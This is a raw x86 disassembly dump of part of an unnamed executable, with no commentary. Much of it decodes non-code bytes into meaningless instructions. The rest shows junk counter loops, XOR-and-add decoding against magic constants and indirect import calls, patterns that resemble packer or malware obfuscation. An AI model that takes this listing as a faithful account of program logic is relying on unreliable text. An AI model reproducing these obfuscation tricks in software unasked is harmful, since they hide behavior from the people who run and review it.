  407c81:	xor    cl,BYTE PTR [edi]
  407c83:	add    DWORD PTR [edi-0x4c869e33],esi
  407c89:	aaa    
  407c8a:	out    0xcb,eax
  407c8c:	out    dx,eax
  407c8d:	jge    0x407cd7
  407c8f:	pop    esp
  407c90:	and    DWORD PTR [ebp-0x26],eax
  407c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c94:	loopne 0x407c50
  407c96:	push   eax
  407c97:	push   esi
  407c98:	dec    ebx
  407c99:	(bad)  
  407c9a:	nop
  407c9b:	lods   eax,DWORD PTR ds:[esi]
  407c9c:	test   DWORD PTR [edi-0x29],0xb6846c54
  407ca3:	cmp    eax,0x82ad53f4
  407ca8:	imul   eax,DWORD PTR [eax],0x19eca8b6
  407cae:	lds    esi,FWORD PTR [edi+0x3444f744]
  407cb4:	data16 xor al,0x41
  407cb7:	into   
  407cb8:	xchg   edi,eax
  407cb9:	xchg   ebp,eax
  407cba:	fwait
  407cbb:	mov    ecx,DWORD PTR [ebp-0x19b51355]
  407cc1:	scas   al,BYTE PTR es:[edi]
  407cc2:	or     al,0x3a
  407cc4:	jno    0x407cf2
  407cc6:	push   edi
  407cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cc8:	cdq    
  407cc9:	sbb    edi,edx
  407ccb:	mov    ebx,0xc106b0f8
  407cd0:	xchg   ebx,eax
  407cd1:	cwde   
  407cd2:	(bad)  
  407cd4:	gs pusha 
  407cd6:	mov    al,0xba
  407cd8:	inc    edx
  407cd9:	push   0xf29d8c36
  407cde:	bound  ecx,QWORD PTR [eax+ecx*2-0x24ca6cd4]
  407ce5:	ret    
  407ce6:	push   0x3
  407ce8:	mov    ?,ebp
  407cea:	and    edi,0x290a322
  407cf0:	pop    ebx
  407cf1:	call   0xecd4c1b1
  407cf6:	leave  
  407cf7:	or     eax,0xd2c9e0ba
  407cfc:	lds    ebp,FWORD PTR [ebx+0xf]
  407cff:	int    0x7f
  407d01:	jmp    0x78bf02d9
  407d06:	jae    0x407d7e
  407d08:	(bad)  
  407d09:	pop    eax
  407d0a:	adc    eax,0xbc1d4741
  407d0f:	mov    al,ds:0xebccbec1
  407d14:	cld    
  407d15:	dec    esp
  407d16:	sbb    DWORD PTR [esi-0x53],edi
  407d19:	in     eax,0x5a
  407d1b:	popa   
  407d1c:	stos   BYTE PTR es:[edi],al
  407d1d:	sub    ebp,edx
  407d1f:	shr    BYTE PTR ds:0x3b74ced,cl
  407d25:	xor    dh,BYTE PTR [ebx-0x50]
  407d28:	add    cl,ah
  407d2a:	test   al,0xaa
  407d2c:	call   0xd701a228
  407d31:	xchg   esi,eax
  407d32:	pop    esp
  407d33:	imul   esi,DWORD PTR [ecx],0x4e1a436e
  407d39:	sub    BYTE PTR [ecx+ecx*1-0x32b4aa41],cl
  407d40:	sub    eax,0xb5ac9a36
  407d45:	jp     0x407da4
  407d47:	pop    es
  407d48:	aam    0x6a
  407d4a:	int    0xd2
  407d4c:	popf   
  407d4d:	nop
  407d4e:	push   ss
  407d4f:	outs   dx,BYTE PTR ds:[esi]
  407d50:	(bad)  
  407d51:	aam    0xe8
  407d53:	adc    DWORD PTR [edx],edi
  407d55:	fld    DWORD PTR [ebx]
  407d57:	out    dx,al
  407d58:	and    DWORD PTR [esi-0x612c6a12],eax
  407d5e:	sub    eax,0x9ae69ffc
  407d63:	and    al,0x42
  407d65:	push   esi
  407d66:	inc    esi
  407d67:	adc    ah,BYTE PTR [ecx]
  407d69:	stos   BYTE PTR es:[edi],al
  407d6a:	adc    ecx,DWORD PTR [esi]
  407d6c:	popa   
  407d6d:	pop    eax
  407d6e:	mov    ebp,0xafe7b68b
  407d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d74:	into   
  407d75:	stos   BYTE PTR es:[edi],al
  407d76:	and    DWORD PTR [edx+0xf],ecx
  407d79:	mov    al,ds:0x6d4ff3a8
  407d7e:	iret   
  407d7f:	neg    BYTE PTR cs:[eax-0xaf3c305]
  407d86:	pop    eax
  407d87:	mov    WORD PTR ds:0x9b34b45d,es
  407d8d:	jmp    0x33d2dfa3
  407d92:	push   ds
  407d93:	mov    esp,0xf5fd2d38
  407d98:	mov    dl,BYTE PTR [edi+ebp*4-0x5d84621c]
  407d9f:	jnp    0x407d88
  407da1:	jl     0x407dfc
  407da3:	mov    ecx,0x64dee32f
  407da8:	xchg   edi,eax
  407da9:	rol    DWORD PTR [ebp+0x48],1
  407dac:	and    eax,0xae51c7e3
  407db1:	xchg   ebx,eax
  407db2:	adc    dh,BYTE PTR [ebp+0x5e]
  407db5:	fidiv  DWORD PTR ds:0xa7138afb
  407dbb:	std    
  407dbc:	and    BYTE PTR [edx],bh
  407dbe:	xchg   esp,eax
  407dbf:	xor    al,0x33
  407dc1:	adc    al,BYTE PTR [eax+0x800ab91]
  407dc7:	fiadd  WORD PTR [ebx]
  407dc9:	and    ebx,0xa
  407dcc:	adc    dh,BYTE PTR [ecx-0x34]
  407dcf:	stc    
  407dd0:	in     eax,0xa8
  407dd2:	pop    es
  407dd3:	lock pop ebp
  407dd5:	popf   
  407dd6:	js     0x407d92
  407dd8:	aas    
  407dd9:	jmp    0x407d8d
  407ddb:	pusha  
  407ddc:	and    ebp,ebp
  407dde:	ror    esp,cl
  407de0:	mov    ecx,0x90fb6d2
  407de5:	clc    
  407de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407de7:	in     eax,0xdd
  407de9:	jae    0x407d74
  407deb:	mov    edi,0xf07b5799
  407df0:	pop    eax
  407df1:	add    al,0xd
  407df3:	mov    dh,0x10
  407df5:	int3   
  407df6:	arpl   bp,cx
  407df8:	or     eax,0x7e2fd3ab
  407dfd:	pop    ecx
  407dfe:	sti    
  407dff:	fist   WORD PTR ds:0xa4d664d
  407e05:	dec    ebx
  407e06:	popf   
  407e07:	xor    cl,al
  407e09:	test   eax,0x4017e824
  407e0e:	add    al,0x18
  407e10:	sbb    al,0xac
  407e12:	jo     0x407e3c
  407e14:	mov    dl,0x6c
  407e17:	mov    dl,0x71
  407e19:	sbb    BYTE PTR [edx],bh
  407e1b:	inc    BYTE PTR [ebx-0x17481eb4]
  407e21:	mov    ds:0x7786f6ce,al
  407e26:	push   cs
  407e27:	xchg   ecx,eax
  407e28:	repnz adc eax,ebp
  407e2b:	xor    BYTE PTR [ebx-0x280f8b7c],dh
  407e31:	imul   esi,DWORD PTR [edi],0xc6ef0ce7
  407e37:	pop    edx
  407e38:	adc    al,0x61
  407e3a:	movaps XMMWORD PTR [ebx],xmm6
  407e3d:	push   ss
  407e3e:	neg    DWORD PTR [ecx-0x6e]
  407e41:	ret    0x6813
  407e44:	imul   ebx,DWORD PTR [edx+0xb491f78],0xf
  407e4b:	cdq    
  407e4c:	mov    al,0x70
  407e4e:	adc    eax,0xa13eebc0
  407e53:	or     eax,0xef39afd
  407e58:	aam    0xe8
  407e5a:	dec    ebx
  407e5b:	shl    BYTE PTR [eax-0x30],1
  407e5e:	mov    eax,0x1089cb44
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4336eb
  407f81:	or     DWORD PTR ds:0x4336ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433757,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433753,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43379b
  407fad:	sub    DWORD PTR ds:0x433727,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4336db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43372b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43372b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43372b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43372b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43372b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433967
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43372b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43372b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43372b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43372b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43372b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43372b,ebx
  408048:	cmp    DWORD PTR ds:0x43372b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43372b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43372b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43372b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43372b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43367b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43375b
  4080b1:	and    DWORD PTR ds:0x433763,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43371b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4337a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4337a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4337a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4337a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43375b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4337a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4337a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4337a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4337a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433797,0x1f
  40813b:	cmp    DWORD PTR ds:0x433797,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433797,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433797
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433797,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xeef4930d
  408191:	jp     0x4081d1
  408193:	retf   0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	xchg   BYTE PTR [esi],ah
  40819c:	xchg   ecx,eax
  40819d:	aas    
  40819e:	outs   dx,DWORD PTR ds:[esi]
  40819f:	retf   
  4081a0:	cmp    dl,bh
  4081a2:	imul   eax,DWORD PTR [ecx],0xa42614e0
  4081a8:	dec    ecx
  4081a9:	add    al,0x44
  4081ab:	dec    esp
  4081ac:	imul   edi,DWORD PTR [ecx],0xb1aae497
  4081b2:	jae    0x40820c
  4081b4:	out    0x64,eax
  4081b6:	ds adc al,0x10
  4081b9:	popa   
  4081ba:	ins    BYTE PTR es:[edi],dx
  4081bb:	in     al,dx
  4081bc:	out    0x84,eax
  4081be:	adc    BYTE PTR [edi+0x3c],al
  4081c1:	mov    ebx,0xfc8d2452
  4081c6:	pushf  
  4081c7:	stos   DWORD PTR es:[edi],eax
  4081c8:	(bad)  
  4081c9:	cmc    
  4081ca:	test   eax,0xd8fbd280
  4081cf:	push   ebp
  4081d0:	mov    bh,0xc7
  4081d2:	mov    dl,0x6
  4081d4:	push   edx
  4081d5:	int3   
  4081d6:	arpl   dx,si
  4081d8:	mov    BYTE PTR [ebx+0x56a166cd],0xc3
  4081df:	in     eax,dx
  4081e0:	ret    0xf843
  4081e3:	sub    eax,0x1f84ab3d
  4081e8:	push   ebx
  4081e9:	ret    
  4081ea:	(bad)  
  4081eb:	icebp  
  4081ec:	dec    ebp
  4081ed:	jmp    0xb7:0xea2557de
  4081f4:	mov    bh,0x95
  4081f6:	inc    ecx
  4081f7:	mov    DWORD PTR [edx-0x56],ecx
  4081fa:	push   cs
  4081fb:	pushf  
  4081fc:	imul   ebp,DWORD PTR [eax+0x47],0x3022708b
  408203:	mov    ebp,0x70398c9d
  408208:	fimul  DWORD PTR [ebp+0x79589244]
  40820e:	int    0xa4
  408210:	pushf  
  408211:	jnp    0x4081ec
  408213:	mov    al,0xc3
  408215:	out    dx,al
  408216:	mov    ds:0xec1dac72,eax
  40821b:	mov    WORD PTR [esi],ds
  40821d:	push   ebx
  40821e:	sub    ebx,DWORD PTR [ecx-0xf]
  408221:	or     eax,0x13f59550
  408226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408227:	rol    BYTE PTR [eax-0x2f],1
  40822a:	dec    ebx
  40822b:	push   eax
  40822c:	std    
  40822d:	push   eax
  40822e:	ss pop esp
  408230:	out    0x13,eax
  408232:	(bad)  
  408234:	mov    ecx,0x629e419c
  408239:	adc    cl,BYTE PTR [edi]
  40823b:	xchg   edi,eax
  40823c:	sub    dh,BYTE PTR [esi-0xc]
  40823f:	jo     0x40825a
  408241:	mov    bh,0x6
  408243:	dec    esp
  408244:	mov    ebp,0xac762419
  408249:	les    eax,FWORD PTR [esi]
  40824b:	jge    0x408292
  40824d:	mov    eax,0xc8b3b294
  408252:	jae    0x408240
  408254:	cdq    
  408255:	add    ebx,DWORD PTR [ecx]
  408257:	push   0x38
  408259:	and    BYTE PTR [ebp+edx*1+0x62489b7],ah
  408260:	test   dl,ah
  408262:	fistp  DWORD PTR [ecx+eax*1]
  408265:	lahf   
  408266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408267:	out    0x38,al
  408269:	and    al,0x93
  40826b:	adc    ah,BYTE PTR ds:0xb735a5bf
  408271:	stos   DWORD PTR es:[edi],eax
  408272:	dec    edi
  408273:	mov    BYTE PTR [ebx+0x2b],dl
  408276:	add    al,0xfb
  408278:	push   ebx
  408279:	dec    esp
  40827a:	hlt    
  40827b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827c:	outs   dx,DWORD PTR ds:[esi]
  40827d:	repnz pop ecx
  40827f:	cwde   
  408280:	jnp    0x4082a4
  408282:	push   0x44
  408284:	mov    bl,0xf4
  408286:	(bad)  
  408287:	fist   WORD PTR [eax]
  408289:	cwde   
  40828a:	daa    
  40828b:	or     edi,DWORD PTR [eax+eiz*4-0x1f48f79]
  408292:	xchg   ebx,ebp
  408294:	not    DWORD PTR [esi-0x7]
  408297:	mov    esi,0x4a98508d
  40829c:	mov    ebx,0x69ba5823
  4082a1:	cmp    BYTE PTR [ebx],al
  4082a3:	ficom  WORD PTR [ebx]
  4082a5:	into   
  4082a6:	push   cs
  4082a7:	imul   ebp,DWORD PTR [ecx],0xed4219f
  4082ad:	inc    edi
  4082ae:	mov    WORD PTR [ecx],ss
  4082b0:	pop    esi
  4082b1:	sbb    DWORD PTR ds:[esp+edx*4+0x9],ebp
  4082b6:	pop    ss
  4082b7:	add    BYTE PTR [edi],al
  4082b9:	jmp    0xc850:0x12fb83be
  4082c0:	arpl   WORD PTR [ebx+0x4],ax
  4082c3:	add    bl,BYTE PTR [ebp+0x20ba4e7]
  4082c9:	test   al,0xa8
  4082cb:	add    al,0xa2
  4082cd:	fsin   
  4082cf:	push   ebp
  4082d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082d1:	xchg   edi,eax
  4082d2:	add    al,0xd9
  4082d4:	les    ebp,FWORD PTR [ebx+0x680207f0]
  4082da:	add    eax,0x972e6902
  4082df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082e0:	add    DWORD PTR [esp+edx*1],ebp
  4082e3:	leave  
  4082e4:	mov    ah,0xd2
  4082e6:	repz imul edi,DWORD PTR [bp+di],0xda6c2ef5
  4082ee:	mov    edi,ds
  4082f0:	cwde   
  4082f1:	scas   eax,DWORD PTR es:[edi]
  4082f2:	pop    ecx
  4082f3:	sub    BYTE PTR ss:[edx],dl
  4082f6:	daa    
  4082f7:	popa   
  4082f8:	rcr    BYTE PTR [esi],cl
  4082fa:	dec    ecx
  4082fb:	es cmp bh,dh
  4082fe:	dec    ebx
  4082ff:	dec    ebx
  408300:	inc    esp
  408301:	xor    bh,BYTE PTR [edi]
  408303:	pop    ss
  408304:	fistp  DWORD PTR [eax]
  408306:	in     al,dx
  408307:	mov    esp,0x1828a1bc
  40830c:	mov    ch,0xe8
  40830e:	add    ebp,esi
  408310:	scas   al,BYTE PTR es:[edi]
  408311:	hlt    
  408312:	mov    ebx,0xa55f7dbe
  408317:	sub    esi,DWORD PTR [ebx-0x69]
  40831a:	xor    BYTE PTR [ebx-0x58048ba2],dl
  408320:	fcom   QWORD PTR [ecx+0x564854e6]
  408326:	push   cs
  408327:	imul   edi,DWORD PTR [ebp-0x74],0x18cf8381
  40832e:	sbb    al,0xdd
  408330:	rcl    esi,cl
  408332:	pop    edx
  408333:	cmp    ecx,edi
  408335:	xor    dh,bh
  408337:	cmc    
  408338:	arpl   WORD PTR [ebp+0x2fa37f6d],di
  40833e:	xor    edx,DWORD PTR [ebx+0x3605e9c5]
  408344:	xchg   ecx,eax
  408345:	cli    
  408346:	aas    
  408347:	stos   DWORD PTR es:[edi],eax
  408348:	js     0x4083ab
  40834a:	dec    esp
  40834b:	and    eax,0xa001de90
  408350:	in     al,dx
  408351:	or     eax,esp
  408353:	pop    ebp
  408354:	into   
  408355:	adc    DWORD PTR [ecx+0x158f4dba],ebx
  40835b:	aas    
  40835c:	add    BYTE PTR [ebp-0x2b5e139d],bh
  408362:	test   DWORD PTR [ebx+0x20],0xd74bb8e0
  408369:	xchg   esp,eax
  40836a:	test   BYTE PTR [ebx+0x232a2b89],al
  408370:	push   ss
  408371:	adc    al,0xcd
  408373:	jb     0x40830d
  408375:	jnp    0x4083eb
  408377:	xchg   ecx,eax
  408378:	cmp    bl,BYTE PTR ds:0x455a51aa
  40837e:	mov    ebx,0x65012835
  408383:	pop    esp
  408384:	and    al,0x52
  408386:	(bad)  
  408388:	xchg   esp,eax
  408389:	and    eax,DWORD PTR [edx+0x6]
  40838c:	cmp    eax,0xade88e2c
  408391:	(bad)  
  408392:	add    ebp,edi
  408394:	fsubr  QWORD PTR [ebp+0x3be6b4f3]
  40839a:	xchg   edi,eax
  40839b:	inc    ecx
  40839c:	sub    edx,edx
  40839e:	int    0x5b
  4083a0:	in     al,0x40
  4083a2:	outs   dx,DWORD PTR ds:[esi]
  4083a3:	in     al,0xd1
  4083a5:	loopne 0x4083bc
  4083a7:	sub    al,0x25
  4083a9:	pop    eax
  4083aa:	test   al,0xa6
  4083ac:	inc    esp
  4083ad:	xor    BYTE PTR [ebx+0x7584a575],0x74
  4083b4:	das    
  4083b5:	aas    
  4083b6:	mov    DWORD PTR [ecx+0x3a63b389],esi
  4083bc:	out    0x82,eax
  4083be:	out    dx,al
  4083bf:	pop    es
  4083c0:	or     eax,0x8929a5f0
  4083c5:	inc    ebp
  4083c6:	loopne 0x408349
  4083c8:	and    eax,0x4336db
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	mov    eax,ds:0x4336db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4336db,eax
  4083dc:	cmp    DWORD PTR ds:0x4336db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4336db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4336db
  40840c:	inc    eax
  40840d:	mov    ds:0x4336db,eax
  408412:	cmp    DWORD PTR ds:0x4336db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43368b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433693,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4337a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	dec    al
  408466:	xor    eax,DWORD PTR [edx]
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	and    eax,0x76988228
  408475:	ror    BYTE PTR [esi-0x1150f034],0xd7
  40847c:	push   0xa7465cc0
  408481:	add    DWORD PTR [edx],ecx
  408483:	jb     0x4084fe
  408485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408486:	ins    BYTE PTR es:[edi],dx
  408487:	and    BYTE PTR [edi+ecx*4+0x5971ed15],bh
  40848e:	pop    esp
  40848f:	repz loop 0x408495
  408492:	sbb    al,0xdd
  408494:	xchg   BYTE PTR ds:0x7b42c3f,bh
  40849a:	scas   al,BYTE PTR es:[edi]
  40849b:	jb     0x4084f6
  40849d:	into   
  40849e:	sub    BYTE PTR [esi-0x28],0x2c
  4084a2:	sbb    eax,ebx
  4084a4:	wbinvd 
  4084a6:	jbe    0x408473
  4084a8:	fisttp WORD PTR [ebx+0x5d800698]
  4084ae:	cmp    BYTE PTR [eax+ebp*8+0x3fbfedb3],cl
  4084b5:	call   0x51d8361b
  4084ba:	pop    ebx
  4084bb:	sbb    ch,dl
  4084bd:	aaa    
  4084be:	sub    al,al
  4084c0:	pop    es
  4084c1:	add    edi,DWORD PTR [ebp-0x4]
  4084c4:	cmp    BYTE PTR [esi-0x53f056ec],al
  4084ca:	aam    0x9d
  4084cc:	cmp    BYTE PTR [eax+0x7e],al
  4084cf:	xchg   esi,eax
  4084d0:	mov    eax,0x73d35240
  4084d5:	mov    eax,DWORD PTR [edi]
  4084d7:	push   ds
  4084d8:	les    ebx,FWORD PTR [ebp+0x68]
  4084db:	test   BYTE PTR [esi-0x1ba3e6ab],bh
  4084e1:	pop    edx
  4084e2:	or     eax,0x5e60415b
  4084e7:	jp     0x40854a
  4084e9:	sbb    ebx,eax
  4084eb:	hlt    
  4084ec:	sbb    ah,BYTE PTR [eax]
  4084ee:	xchg   ebx,eax
  4084ef:	xor    edi,DWORD PTR [esp+ebp*1-0x437dee5f]
  4084f6:	shl    bh,0x3b
  4084f9:	dec    eax
  4084fa:	pop    edi
  4084fb:	fsubr  DWORD PTR [eax+ebx*8]
  4084fe:	es sub al,0xd8
  408501:	dec    esi
  408502:	cmp    eax,0x4ba215f7
  408507:	(bad)  
  408508:	sbb    esp,esi
  40850a:	lahf   
  40850b:	jbe    0x4084d7
  40850d:	cmp    al,BYTE PTR [esi-0x470a442e]
  408513:	(bad)  
  408515:	stos   BYTE PTR es:[edi],al
  408516:	addr16 push ss
  408518:	test   DWORD PTR [esi],ebp
  40851a:	icebp  
  40851b:	cmp    edi,edx
  40851d:	outs   dx,DWORD PTR ds:[esi]
  40851e:	jo     0x4084ff
  408520:	mov    bh,0x32
  408522:	jmp    0x7792f046
  408527:	cmp    ah,cl
  408529:	loopne 0x408598
  40852b:	cdq    
  40852c:	test   DWORD PTR [ecx+eiz*1-0x630aa2cc],ebx
  408533:	and    BYTE PTR [ecx],al
  408535:	dec    ebx
  408536:	rcr    DWORD PTR [eax+ecx*8],cl
  408539:	cmp    BYTE PTR gs:[edi+0x10fd834a],ch
  408540:	fwait
  408541:	sbb    eax,0xeb30e816
  408546:	mov    bl,0xe9
  408548:	dec    esp
  408549:	(bad)  
  40854b:	cmp    DWORD PTR [esi+0x77481af3],esp
  408551:	jns    0x40855d
  408553:	(bad)  
  408554:	out    dx,al
  408555:	mov    al,0x4e
  408557:	rcl    DWORD PTR [ecx+ebx*1+0xd],0x74
  40855c:	pop    esi
  40855d:	retf   0xc8f1
  408560:	test   BYTE PTR [ecx+0xa],0x42
  408564:	mov    bl,0x2b
  408566:	ret    
  408567:	mov    al,BYTE PTR [edx]
  408569:	inc    esi
  40856a:	xchg   BYTE PTR [ebp+0x563d4611],al
  408570:	pop    eax
  408571:	addr16 retf 0xb143
  408575:	dec    esp
  408576:	mov    bl,BYTE PTR [ecx-0x16ea8c50]
  40857c:	iret   
  40857d:	push   edx
  40857e:	cmp    cl,al
  408580:	loop   0x40850e
  408582:	or     eax,0x9c2cccdf
  408587:	mov    bl,0x36
  408589:	nop
  40858a:	sbb    DWORD PTR [ecx-0xd],ebx
  40858d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40858e:	(bad)  
